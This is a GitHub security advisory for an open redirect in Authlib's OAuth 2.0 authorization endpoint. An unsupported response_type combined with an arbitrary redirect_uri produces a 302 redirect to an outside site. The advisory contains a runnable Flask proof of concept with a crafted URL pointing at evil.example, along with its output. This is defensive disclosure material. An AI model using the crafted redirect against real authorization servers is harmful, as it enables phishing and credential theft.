# [M] Authlib OAuth 2.0 has Open Redirect in Authorization API that allows attacker-controlled redirect_uri through unsupported response_type

## Summary
Severity: Medium
Advisory: GHSA-w8p2-r796-3vmq
CVE: CVE-2026-41479
CWE: CWE-601
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-06-08
Source: https://github.com/advisories/GHSA-w8p2-r796-3vmq
Type: github-advisory

## Affected
- PyPI: `authlib` — affected >=0 <1.6.10
- PyPI: `authlib` — affected >=1.7.0 <1.7.1

## Details
### Summary
Authlib's OAuth 2.0 authorization endpoint can be turned into an unauthenticated open redirect when a request uses an unsupported response_type and supplies an attacker-controlled redirect_uri.

The vulnerable behavior happens before client lookup and before any redirect URI validation. As a result, an attacker does not need a valid client registration, an authenticated user, or any prior state. A single request to the authorization endpoint is enough to obtain a 302 Location response to an arbitrary attacker-controlled URL.

It was confirmed that the vulnerable code is present in tag v1.6.6 and in the current HEAD under test (68e6ab3fdfc71a328b1966bad5c6aba0f7d0c2e1, git describe: v1.6.6-104-g68e6ab3f). The issue was dynamically reproduced locally on the current HEAD.

### Details
The root cause is that `AuthorizationServer.get_authorization_grant()` copies the raw request
  `redirect_uri` into an `UnsupportedResponseTypeError` before any client has been resolved and
  before any redirect URI validation has happened:

  ```python
  # authlib/oauth2/rfc6749/authorization_server.py
  raise UnsupportedResponseTypeError(
      f"The response type '{request.payload.response_type}' is not supported by the server.",
      request.payload.response_type,
      redirect_uri=request.payload.redirect_uri,
  )

  That error object is later rendered by OAuth2Error.__call__(). If redirect_uri is set, Authlib
  automatically returns a redirect response to that URI:

  # authlib/oauth2/base.py
  def __call__(self, uri=None):
      if self.redirect_uri:
          params = self.get_body()
          loc = add_params_to_uri(self.redirect_uri, params, self.redirect_fragment)
          return 302, "", [("Location", loc)]
      return super().__call__(uri=uri)

  This means an unsupported response_type request can force the authorization server to redirect
  to an attacker-controlled URL even when:

  1. no valid client exists,
  2. no grant matched the request,
  3. no registered redirect_uri was ever checked.

  This is not a contrived code path. It is reachable through the normal Authlib authorization
  endpoint flow documented for Flask and Django integrations, where applications are told to call
  server.get_consent_grant(...) and then server.handle_error_response(...) on OAuth2Error.

  Relevant source and documentation references:

  - authlib/oauth2/rfc6749/authorization_server.py
  - authlib/oauth2/base.py
  - docs/flask/2/authorization-server.rst
  - docs/django/2/authorization-server.rst

  ### PoC

  Local test environment:

  - Repository checkout: 68e6ab3fdfc71a328b1966bad5c6aba0f7d0c2e1
  - git describe: v1.6.6-104-g68e6ab3f
  - Python virtualenv: ./.venv
  - Environment variable: AUTHLIB_INSECURE_TRANSPORT=true

  Note: AUTHLIB_INSECURE_TRANSPORT=true was only used to allow local loopback HTTP reproduction.
  It does not create the vulnerable behavior. In a real deployment the same logic is reachable
  over HTTPS.

  Run this exact PoC from the repository root:

  export AUTHLIB_INSECURE_TRANSPORT=true
  ./.venv/bin/python - <<'PY'
  import os, json
  from flask import Flask, request
  from authlib.integrations.flask_oauth2 import AuthorizationServer
  from authlib.oauth2 import OAuth2Error
  from authlib.oauth2.rfc6749.grants import AuthorizationCodeGrant as _AuthorizationCodeGrant

  os.environ["AUTHLIB_INSECURE_TRANSPORT"] = "true"

  class AuthorizationCodeGrant(_AuthorizationCodeGrant):
      def save_authorization_code(self, code, request):
          raise RuntimeError("not reached")
      def query_authorization_code(self, code, client):
          return None
      def delete_authorization_code(self, authorization_code):
          pass
      def authenticate_user(self, authorization_code):
          return None

  app = Flask(__name__)
  app.secret_key = "testing"

  server = AuthorizationServer(
      app,
      query_client=lambda client_id: None,
      save_token=lambda token, request: None,
  )
  server.register_grant(AuthorizationCodeGrant)

  @app.route("/oauth/authorize", methods=["GET", "POST"])
  def authorize():
      try:
          grant = server.get_consent_grant(end_user=None)
      except OAuth2Error as error:
          return server.handle_error_response(request, error)
      return server.create_authorization_response(grant=grant, grant_user=None)

  with app.test_client() as c:
      cases = {
          "without_redirect_uri": "/oauth/authorize?response_type=totally-unsupported&state=s1",
          "with_attacker_redirect_uri": "/oauth/authorize?response_type=totally-
  unsupported&redirect_uri=https%3A%2F%2Fevil.example%2Flanding&state=s1",
      }
      out = {}
      for name, url in cases.items():
          r = c.get(url)
          out[name] = {
              "status": r.status_code,
              "location": r.headers.get("Location"),
              "body": r.get_data(as_text=True),
          }
      print(json.dumps(out, indent=2))
  PY

  Observed result:

  {
    "without_redirect_uri": {
      "status": 400,
      "location": null,
      "body": "{\"error\": \"unsupported_response_type\", \"error_description\": \"totally-
  unsupported\", \"state\": \"s1\"}"
    },
    "with_attacker_redirect_uri": {
      "status": 302,
      "location":
  "https://evil.example/landing?error=unsupported_response_type&error_description=totally-unsupported&state=s1",                                                                                    
      "body": ""
    }
  }

  This demonstrates that the only difference between a local error and an external redirect is
  whether the attacker supplies redirect_uri.

  The same behavior was locally reproduced with the Django integration using RequestFactory; it
  returned:

  {
    "status": 302,
    "location":
  "https://evil.example/landing?error=unsupported_response_type&error_description=totally-unsupported&state=s1",                                                                                    
    "body": ""
  }

### Impact
  This is an unauthenticated open redirect in an internet-facing authorization endpoint.

  Who is impacted:

  - Any deployment using Authlib's OAuth 2.0 authorization server and the documented authorization
    endpoint flow.
  - No special feature flag is required beyond running the authorization endpoint itself.

  Attacker prerequisites:

  - None beyond the ability to send a victim to a crafted authorization URL.

  Practical harm:

  - Phishing and credential theft by abusing a trusted authorization server domain as a
    redirector.
  - Bypass of domain-based allowlists that trust the authorization server's host.
  - SSO / OAuth confusion in ecosystems where trusted authorization endpoints are expected to
    reject unregistered redirect URIs before redirecting.

  The issue is especially concerning because the redirect happens before client existence and
  redirect URI legitimacy are established.

## References
- https://github.com/authlib/authlib/security/advisories/GHSA-w8p2-r796-3vmq
- https://nvd.nist.gov/vuln/detail/CVE-2026-41479
- https://github.com/authlib/authlib/commit/3be08468201a7766a93012ce149ea12822cab096
- https://github.com/authlib/authlib
- https://github.com/pypa/advisory-database/tree/main/vulns/authlib/PYSEC-2026-2119.yaml
